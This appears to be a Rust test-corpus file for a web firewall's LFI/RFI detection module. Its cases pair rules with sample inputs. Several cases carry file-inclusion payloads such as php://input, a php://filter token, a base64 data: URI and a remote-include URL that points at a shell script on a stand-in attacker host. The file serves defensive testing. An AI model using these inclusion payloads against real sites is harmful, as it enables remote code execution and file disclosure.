//! LFI/RFI corpus cases. Field coverage: query + cookies + body. This module
//! detects inclusion *mechanisms* (wrappers/streams, remote scripts), not the
//! filesystem paths (those are path_traversal). Note: rfi-remote-url (PL3) matches
//! ANY http(s)/ftp URL and is FP-prone by design, so benign cases avoid URLs.
//! Rules (paranoia): lfi-stream-wrapper 1, lfi-filter-chain 1, lfi-data-base64 2,
//! rfi-remote-script 2, rfi-remote-url 3.

use crate::{Case, Expect, Field, Module};

pub static CASES: &[Case] = &[
    // ── malicious: one per rule ────────────────────────────────────────────────
    Case {
        id: "lfi-stream-wrapper-query",
        module: Module::LfiRfi,
        field: Field::Query { name: "file", value: "php://input" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["lfi-stream-wrapper"],
        desc: "php:// stream wrapper",
    },
    Case {
        id: "lfi-filter-chain-query",
        module: Module::LfiRfi,
        field: Field::Query { name: "file", value: "convert.base64-encode" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["lfi-filter-chain"],
        desc: "php://filter conversion chain token (isolated from the wrapper)",
    },
    Case {
        id: "lfi-data-base64-query",
        module: Module::LfiRfi,
        field: Field::Query { name: "d", value: "data:text/plain;base64,SGVsbG8=" },
        min_pl: 2,
        expect: Expect::Triggers,
        rules: &["lfi-data-base64"],
        desc: "data: URI carrying a base64 payload (Warning/PL2)",
    },
    Case {
        id: "lfi-rfi-remote-script-query",
        module: Module::LfiRfi,
        field: Field::Query { name: "page", value: "http://evil.example/shell.php" },
        min_pl: 2,
        expect: Expect::Triggers,
        // also fires rfi-remote-url (PL3, bare URL) — assert the script-specific rule.
        rules: &["rfi-remote-script"],
        desc: "remote URL pointing at an executable script (Warning/PL2)",
    },
    Case {
        id: "lfi-rfi-remote-url-query",
        module: Module::LfiRfi,
        field: Field::Query { name: "include", value: "ftp://host.example/resource" },
        min_pl: 3,
        expect: Expect::Triggers,
        rules: &["rfi-remote-url"],
        desc: "bare remote URL in a parameter (Notice/PL3)",
    },
    // ── benign / traps ─────────────────────────────────────────────────────────
    Case {
        id: "lfi-benign-template-name",
        module: Module::LfiRfi,
        field: Field::Query { name: "template", value: "home" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "ordinary template name, no wrapper or URL",
    },
    Case {
        id: "lfi-benign-locale",
        module: Module::LfiRfi,
        field: Field::Query { name: "lang", value: "en-US" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "locale code, no inclusion mechanism",
    },
];
